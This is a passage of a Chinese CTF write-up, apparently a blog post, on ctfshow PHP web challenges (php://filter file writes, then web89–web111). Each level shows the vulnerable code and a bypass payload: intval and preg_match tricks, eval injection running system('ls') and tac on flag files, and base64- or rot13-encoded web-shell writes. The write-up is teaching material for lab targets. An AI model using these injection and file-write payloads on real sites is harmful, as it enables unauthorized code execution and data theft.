<p><code>%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2563%256f%256e%2576%2565%2572%2574%252e%2562%2561%2573%2565%2536%2534%252d%2564%2565%2563%256f%2564%2565%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2566%256c%2561%2567%252e%2570%2568%2570</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">encodeAllStrings</span>(<span class="params">strings</span>):</span><br><span class="line">     <span class="keyword">return</span> <span class="string">&quot;&quot;</span>.join(<span class="string">&quot;%&#123;0:0&gt;2&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">format</span>(<span class="built_in">ord</span>(char), <span class="string">&quot;x&quot;</span>)) <span class="keyword">for</span> char <span class="keyword">in</span> strings)</span><br><span class="line">  r = encodeAllStrings(a)</span><br><span class="line">  parse.quote(r)</span><br></pre></td></tr></table></figure>

<blockquote>
<p>content是写入内容,要进行base64编码 对应上面的伪协议解码,而base解码时,是4个一组,flag.php(要写入的文件),写入的内容<code>&lt;?php die(&#39;大佬别秀了&#39;);?&gt;</code>中只有phpdie会参与base64解码,因为phpdie只有6个字节,补两个a就是8字节了,在base64解密时会忽略不可识别的字符</p>
<p>总结:我们要在content中写入shell,然后base64编码<br><code>content=&lt;?php system(&#39;ls&#39;);?&gt;</code><br>base64<br><code>content=PD9waHAgc3lzdGVtKCdscycpOz8+</code></p>
<p>我们还要在base64前加上两个字符来凑齐位数，因此content变成了</p>
<p><code>content=aaPD9waHAgc3lzdGVtKCdscycpOz8+</code></p>
</blockquote>
<p><strong>BASE64加密需要4的整数倍</strong></p>
</li>
<li><p>方法二：使用rot13加密</p>
<p>同理，先构造rot13加密的伪协议<code>php://filter/write=string.rot13/resource=2.php</code></p>
<p>然后两次url加密</p>
<p><code>%2570%2568%2570%253a%252f%252f%2566%2569%256c%2574%2565%2572%252f%2577%2572%2569%2574%2565%253d%2573%2574%2572%2569%256e%2567%252e%2572%256f%2574%2531%2533%252f%2572%2565%2573%256f%2575%2572%2563%2565%253d%2532%252e%2570%2568%2570</code></p>
<p>然后payload，<code>&lt;?php system(&#39;tac fl0g.php&#39;)?&gt;</code>使用rot13加密<code>&lt;?cuc flfgrz(&#39;gnp sy0t.cuc&#39;)?&gt;</code></p>
</li>
</ul>
<h3><span id="php特性">php特性</span></h3><h4><span id="web89">web89</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[0-9]/&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>preg_match有个漏洞，当检测的变量是数组的时候会报错并返回0。而intval函数当传入的变量也是数组的时候，会返回1，所以我们可以传个数组绕过，构造payload</p>
<p><code>?num[]=abc</code></p>
</li>
</ul>
<h4><span id="web90">web90</span></h4><p>intval($num,0)意思是检测num的进制类型并返回其十进制的值，若num前缀为0，即判断num为八进制，若num前缀为0x，则判断num为十六进制</p>
<ul>
<li>php中**&#x3D;&#x3D;&#x3D;**<ul>
<li>值相等</li>
<li>类型相同</li>
</ul>
</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>===<span class="string">&quot;4476&quot;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)===<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li><p>方法一：进制转换</p>
<ul>
<li>若num前缀为0，即判断num为八进制，若num前缀为0x，则判断num为十六进制</li>
</ul>
<blockquote>
<p>转化为八进制为010574</p>
<p>转化为十六进制为0x117c</p>
</blockquote>
  <figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// <span class="number">16</span></span><br><span class="line">?num=<span class="number">0</span>x117c</span><br><span class="line">// <span class="number">8</span></span><br><span class="line">?num=<span class="number">010574</span></span><br><span class="line">// <span class="number">2</span></span><br><span class="line">?num=<span class="number">0</span>b1000101111100</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二：科学计数法</p>
<blockquote>
<p>4476e3表示4476*10^3，也就是4476000，</p>
<p>而4476e3做为参数传入的时候可以当成字符串，在进行第一个（&#x3D;&#x3D;&#x3D;）比较时会先转为4476000再比较，到intval函数时，因为没有特征前缀，所以当十进制处理，而intval函数不能处理科学计数法，4476e3会被识别为4476,</p>
</blockquote>
</li>
<li><p>方法三：字符串截取</p>
<ul>
<li>intval处理开头是数字的字符串时，返回值为开头的数。 所以我们可以直接输入 <strong>?num&#x3D;4476a</strong></li>
</ul>
</li>
<li><p>方法四：浮点数</p>
<ul>
<li><p>构造浮点数绕过即可</p>
<p><em>4476.0</em></p>
</li>
</ul>
</li>
<li><p>方法五：使用正号绕过</p>
<p>+010574 </p>
<p>%2b010574</p>
</li>
</ul>
<h4><span id="web91">web91</span></h4><ul>
<li><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_46091464/article/details/108278486">换行解析漏洞</a></p>
<blockquote>
<p>^表示表达式开头，$表示表达式结尾，i表示不区分大小写，m表示多行模式</p>
<p>\n换行，我们仅需用%0a代替即可</p>
</blockquote>
</li>
</ul>
<h4><span id="web93">web93</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$num</span>==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z]/i&quot;</span>, <span class="variable">$num</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;no no no!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>)==<span class="number">4476</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>,<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ul>
<li>过滤了十六进制，我们利用八进制就可以<strong>010574</strong></li>
</ul>
<h4><span id="web94">web94</span></h4><ul>
<li><p>这题增加了对8进制的围追堵截，我们用浮点数绕过</p>
<p><code>4476.0</code></p>
</li>
</ul>
<h4><span id="web97">web97</span></h4><ul>
<li>我一开始写个脚本，不知道要跑到什么时候，暴力好像出不来，可以搜一下网上计算好的md5。</li>
<li>知识点，md5函数无法支持数组操作，因此构造数组即可<ul>
<li>a[]&#x3D;1&amp;b[]&#x3D;2</li>
</ul>
</li>
</ul>
<h4><span id="web99">web99</span></h4><p>in_array()函数有漏洞 没有设置第三个参数，严格匹配。就可以形成自动转换</p>
<blockquote>
<p> n&#x3D;1.php自动转换为1</p>
</blockquote>
<h4><span id="web100">web100</span></h4><p>运算符优先级：**&amp;&amp; &gt; || &gt; &#x3D; &gt; and &gt; or**</p>
<p><strong>is_numeric()</strong> 函数用于检测变量是否为数字或数字字符串。</p>
<p>是数字和数字字符串则返回 TRUE，否则返回 FALSE</p>
<p>**var_dump()**函数可以输出多个值。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;ctfshow.php&quot;</span>);</span><br><span class="line"><span class="comment">//flag in class ctfshow;</span></span><br><span class="line"><span class="variable">$ctfshow</span> = <span class="keyword">new</span> <span class="title function_ invoke__">ctfshow</span>();</span><br><span class="line"><span class="variable">$v1</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line"><span class="variable">$v2</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"><span class="variable">$v3</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"><span class="variable">$v0</span>=<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>) <span class="keyword">and</span> <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$v0</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\;/&quot;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;<span class="subst">$v2</span>(&#x27;ctfshow&#x27;)<span class="subst">$v3</span>&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>v3的话要加注释也行,不加也能运行</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=var_dump($ctfshow)&amp;v3=;</span><br><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="built_in">echo</span> new ReflectionClass(&#x27;ctfshow&#x27;)/*&amp;v3=*/;</span><br><span class="line">或?v1=<span class="number">1</span>&amp;v2=<span class="built_in">echo</span> new ReflectionClass&amp;v3=;</span><br></pre></td></tr></table></figure>

<h4><span id="web105">web105</span></h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_62094846/article/details/122529362">详解</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: Firebasky</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-09-16 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-09-28 22:34:07</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$error</span>=<span class="string">&#x27;你还想要flag嘛？&#x27;</span>;</span><br><span class="line"><span class="variable">$suces</span>=<span class="string">&#x27;既然你想要那给你吧！&#x27;</span>;</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key</span>===<span class="string">&#x27;error&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;<span class="keyword">foreach</span>(<span class="variable">$_POST</span> <span class="keyword">as</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$value</span>===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;what are you doing?!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$$key</span>=<span class="variable">$$value</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!(<span class="variable">$_POST</span>[<span class="string">&#x27;flag&#x27;</span>]==<span class="variable">$flag</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$error</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;your are good&quot;</span>.<span class="variable">$flag</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">die</span>(<span class="variable">$suces</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">你还想要flag嘛？</span><br></pre></td></tr></table></figure>



<blockquote>
<p>&amp;&amp;应用<br>$hell&#x3D;”abc”;<br>$$hell&#x3D;”def”;等同于$abc&#x3D;”def”;</p>
</blockquote>
<p>这里的&amp;&amp;把key的值变为了变量所以可以通过$error和$$suces进行输入flag</p>
<p>我们可以在GET把flag赋值给suces,然后再把suces赋值给error就能显示flag了</p>
<h4><span id="web108">web108</span></h4><p>ereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字 母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">ereg</span> (<span class="string">&quot;^[a-zA-Z]+$&quot;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>])===<span class="literal">FALSE</span>)  &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;error&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//只有36d的人才能看到flag</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))==<span class="number">0x36d</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4><span id="web109">web109</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z]+/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<ul>
<li><p>方法一：反射</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Reflectionclass&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=Reflectionclass&amp;v2=system(&#x27;tac fl36dg.txt&#x27;)</span><br></pre></td></tr></table></figure>
</li>
<li><p>方法二：异常处理</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Exception&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=Exception&amp;v2=system(&#x27;tac fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure>
</li>
<li><p>方法三：错误</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?v1=Error&amp;v2=system(&#x27;ls&#x27;)</span><br><span class="line">?v1=Error&amp;v2=system(&#x27;tac fl36dg.txt&#x27;) </span><br></pre></td></tr></table></figure></li>
</ul>
<h4><span id="web110">web110</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~|\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v2&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;echo new <span class="subst">$v1</span>(<span class="subst">$v2</span>());&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>禁掉了匿名类的payload</p>
<p><strong>要求</strong>：不允许使用特殊字符与数字</p>
<p>　　 v1只能是类，v2为函数或方法，且无参数</p>
<p><strong>分析</strong>：</p>
<p> 1、web109 中的 v2 先为 system(ls) ，后为system(‘tac fl*’)</p>
<p>　　　　步骤为：1）查看目录 2）查看文件信息</p>
<p>　　　　但 ( 被禁用，不能使用 system(ls) 查看目录</p>
<p> 2、考虑查看目录函数的替代：scandir()、golb()、dirname()、basename()、realpath()、getcwd()</p>
<p>　　　　其中 scandir()、golb() 、dirname()、basename()、realpath() 需要给定参数</p>
<p>　　　　而 getcwd() 不需要参数</p>
<p>　　　　很明显 v2&#x3D;getcwd</p>
<p> 3、v1 我们选择读取文件内置类 FilesystemIterator</p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">v1=<span class="built_in">FilesystemIterator</span>&amp;v2=getcwd</span><br></pre></td></tr></table></figure>

<p>访问文件即可</p>
<h4><span id="web111">web111</span></h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params">&amp;<span class="variable">$v1</span>,&amp;<span class="variable">$v2</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&quot;$<span class="subst">$v1</span> = &amp;$<span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">var_dump</span>(<span class="variable">$$v1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v1</span>))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;error v1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\~| |\`|\!|\@|\#|\\$|\%|\^|\&amp;|\*|\(|\)|\_|\-|\+|\=|\&#123;|\[|\;|\:|\&quot;|\&#x27;|\,|\.|\?|\\\\|\/|[0-9]|\&lt;|\&gt;/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span 